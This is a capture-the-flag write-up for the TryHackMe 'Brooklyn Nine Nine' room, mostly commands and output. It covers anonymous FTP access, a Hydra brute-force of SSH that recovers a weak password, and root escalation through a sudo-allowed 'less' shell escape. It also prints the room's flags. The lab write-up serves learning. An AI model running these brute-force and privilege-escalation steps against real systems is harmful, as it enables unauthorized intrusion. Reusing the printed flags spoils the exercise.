---
title: "Brooklyn Nine Nine"
date: 2025-02-11
slug: brooklyn-nine-nine
tags: [tryhackme, linux, web, privesc]
difficulty: Easy
---
ctf writeup for the room # Brooklyn Nine Nine from try hack me 


---

IP = 10.10.142.94

enumeration 

```
❯ nmap -sCV 10.10.142.94

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3

| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel




```

tcp, ssh, http
we know that ftp is open 


`❯ gobuster dir -u http://10.10.142.94/ -w ~/ctf/wordlist/directory-list-2.3-medium.txt -x php,html,js`
found - 



after accessing the ftp anonymously we get a file note_to_jake.txt and that file contains a message 

```
❯ ftp 10.10.142.94
Connected to 10.10.142.94 (10.10.142.94).
220 (vsFTPd 3.0.3)
Name (10.10.142.94:dedfish404): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
227 Entering Passive Mode (10,10,142,94,208,161).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
227 Entering Passive Mode (10,10,142,94,194,234).
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 4.8e-05 secs (2479.17 Kbytes/sec)
```


```
❯ cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

jake password is simple 

*i can try to run hydra on ssh server* 

and i got the password 
```
❯ hydra -l jake -P ../wordlist/rockyou.txt 10.10.142.94 -t 4 ssh
).


[22][ssh] host: 10.10.142.94   login: jake   password: 987654321

```

we got the password as **987654321**

---

**Exploitation**

logging in to ssh 

```
❯ ssh jake@10.10.142.94
The authenticity of host '10.10.142.94 (10.10.142.94)' can't be established.
ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.142.94' (ED25519) to the list of known hosts.
jake@10.10.142.94's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ ls

```

inside this machine we found 

```
jake@brookly_nine_nine:/home$ ls
amy  holt  jake
jake@brookly_nine_nine:/home$ cd jake/
jake@brookly_nine_nine:~$ ls
jake@brookly_nine_nine:~$ ls
jake@brookly_nine_nine:~$ ls -al
total 44
drwxr-xr-x 6 jake jake 4096 May 26  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw------- 1 root root 1349 May 26  2020 .bash_history
-rw-r--r-- 1 jake jake  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jake jake 3771 Apr  4  2018 .bashrc
drwx------ 2 jake jake 4096 May 17  2020 .cache
drwx------ 3 jake jake 4096 May 17  2020 .gnupg
-rw------- 1 root root   67 May 26  2020 .lesshst
drwxrwxr-x 3 jake jake 4096 May 26  2020 .local
-rw-r--r-- 1 jake jake  807 Apr  4  2018 .profile
drwx------ 2 jake jake 4096 May 18  2020 .ssh
-rw-r--r-- 1 jake jake    0 May 17  2020 .sudo_as_admin_successful
jake@brookly_nine_nine:~$ 
jake@brookly_nine_nine:~$ cat .sudo_as_admin_successful 
jake@brookly_nine_nine:~$ 
jake@brookly_nine_nine:~$ cd ..
jake@brookly_nine_nine:/home$ cd amy/
jake@brookly_nine_nine:/home/amy$ ls
jake@brookly_nine_nine:/home/amy$ cd ../holt/
jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt
jake@brookly_nine_nine:/home/holt$ cat user.txt 
ee11cbb19052e40b07aac0ca060c23ee
```

the user flag - ee11cbb19052e40b07aac0ca060c23ee



---

PrivEsc -- 

```
jake@brookly_nine_nine:/usr$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```



searching for PrivEsc on GTFObins we get https://gtfobins.github.io/gtfobins/less/#sudo

## Sudo[]

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo less /etc/profile

    !/bin/sh
```

63a9f0ea7bb98050796b649e85481845
